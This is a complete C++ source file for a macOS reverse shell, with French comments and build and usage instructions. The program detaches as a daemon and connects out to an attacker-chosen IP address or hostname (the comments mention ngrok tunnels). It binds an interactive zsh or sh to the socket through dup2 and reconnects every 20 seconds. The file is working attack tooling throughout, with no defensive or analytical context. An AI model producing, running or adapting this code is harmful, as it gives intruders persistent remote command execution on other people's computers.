// language: C++17, file: src/macos/02_reverse_shell_mac.cpp, target: macOS, clang
// Reverse TCP - zsh interactif via dup2, reconnexion auto 20 s
// Usage: 02_reverse_shell <ip> <port>  (defaut 127.0.0.1 4444)
// Build: clang++ -O2 -std=c++17
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <string>

int main(int argc, char** argv) {
    daemon(0, 0);
    signal(SIGPIPE, SIG_IGN);
    const char* ip = argc > 1 ? argv[1] : "127.0.0.1";
    int port = argc > 2 ? atoi(argv[2]) : 4444;

    // reconnexion auto toutes les 20 s - accepte IP ou hostname (tunnel ngrok, DNS)
    pid_t last = -1;
    for (;;) {
        addrinfo hints{}; hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
        addrinfo* res = nullptr;
        if (getaddrinfo(ip, std::to_string(port).c_str(), &hints, &res) != 0 || !res) {
            sleep(20); continue;
        }
        int s = socket(res->ai_family, SOCK_STREAM, 0);
        if (s < 0) { freeaddrinfo(res); sleep(20); continue; }
        if (connect(s, res->ai_addr, res->ai_addrlen) == 0) {
            if (last > 0) kill(last, SIGKILL); // un shell propre par connexion
            pid_t pid = fork();
            if (pid == 0) {
                dup2(s, 0); dup2(s, 1); dup2(s, 2);
                execv("/bin/zsh", (char*[]){ (char*)"zsh", (char*)"-i", nullptr });
                execv("/bin/sh",  (char*[]){ (char*)"sh", nullptr });
                _exit(1);
            }
            last = pid;
        }
        close(s);
        freeaddrinfo(res);
        sleep(20);
    }
}
